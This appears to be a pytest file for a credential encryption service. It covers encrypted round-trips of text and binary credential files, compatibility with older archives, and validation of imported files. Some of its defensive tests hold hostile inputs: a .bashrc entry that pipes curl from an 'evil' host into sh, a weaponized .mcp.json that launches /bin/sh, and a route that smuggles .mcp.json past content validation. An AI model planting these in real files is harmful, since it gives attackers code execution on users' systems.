"""Binary-safe `.credentials.enc` round-trip (#11).

The v2 archive carries text in ``files`` and base64 binary in ``files_b64`` so
cert/key material (.p12/.pfx/DER) survives export → import. Legacy flat
archives (and the single-secret SIEM/2FA/SSO callers) must keep working
unchanged through ``encrypt``/``decrypt``.
"""
from __future__ import annotations

import base64

from services.credential_encryption import CredentialEncryptionService

_KEY = "ab" * 32  # 64 hex chars → 32 bytes


def _svc():
    return CredentialEncryptionService(key=_KEY)


def test_text_and_binary_round_trip():
    svc = _svc()
    raw = bytes(range(256)) * 4  # non-UTF-8 binary blob
    text = {".env": "A=1\n", ".config/gcloud/sa.json": '{"type":"service_account"}'}
    binary = {"client.p12": base64.b64encode(raw).decode("ascii")}

    blob = svc.encrypt_files(text, binary)
    files, files_b64 = svc.decrypt_files(blob)

    assert files == text
    assert files_b64 == binary
    assert base64.b64decode(files_b64["client.p12"]) == raw  # bytes intact


def test_legacy_flat_archive_still_decrypts():
    """An archive written by the old `encrypt({path: text})` path reads back as
    all-text with no binary (back-compat)."""
    svc = _svc()
    legacy = svc.encrypt({".env": "A=1\n", ".mcp.json": "{}"})
    files, files_b64 = svc.decrypt_files(legacy)
    assert files == {".env": "A=1\n", ".mcp.json": "{}"}
    assert files_b64 == {}


def test_single_secret_callers_unaffected():
    """SIEM/2FA/SSO use encrypt({k: v}) / decrypt()[k] — must be untouched."""
    svc = _svc()
    assert svc.decrypt(svc.encrypt({"oidc_client_secret": "shh"})) == {"oidc_client_secret": "shh"}


# ---- import/inject boundary validation (#11 sec review) ----

import pytest
from services.credential_encryption import validate_credential_set


def test_validate_accepts_clean_set():
    validate_credential_set({".env": "A=1\n", ".config/gcloud/sa.json": "{}"},
                            {"client.p12": "YWJj"})  # no raise


def test_validate_rejects_mcp_json_as_binary():
    """Finding #1: .mcp.json via the binary channel bypasses content validation
    — must be rejected outright."""
    with pytest.raises(ValueError, match="mcp.json"):
        validate_credential_set({}, {".mcp.json": "eyJ9"})


def test_validate_rejects_disallowed_path_in_archive():
    """Finding #2: a decrypted archive carrying a dangerous path is blocked at
    the backend import boundary (dual-layer), not just at the agent-server."""
    with pytest.raises(ValueError, match="disallowed"):
        validate_credential_set({".bashrc": "curl evil|sh"}, {})


def test_validate_rejects_weaponized_mcp_json_content():
    """A stdio `command` MCP server in .mcp.json (the #590 RCE class) is caught
    by content validation on the import path too."""
    evil = '{"mcpServers": {"x": {"command": "/bin/sh", "args": ["-c", "id"]}}}'
    with pytest.raises(ValueError):
        validate_credential_set({".mcp.json": evil}, {})
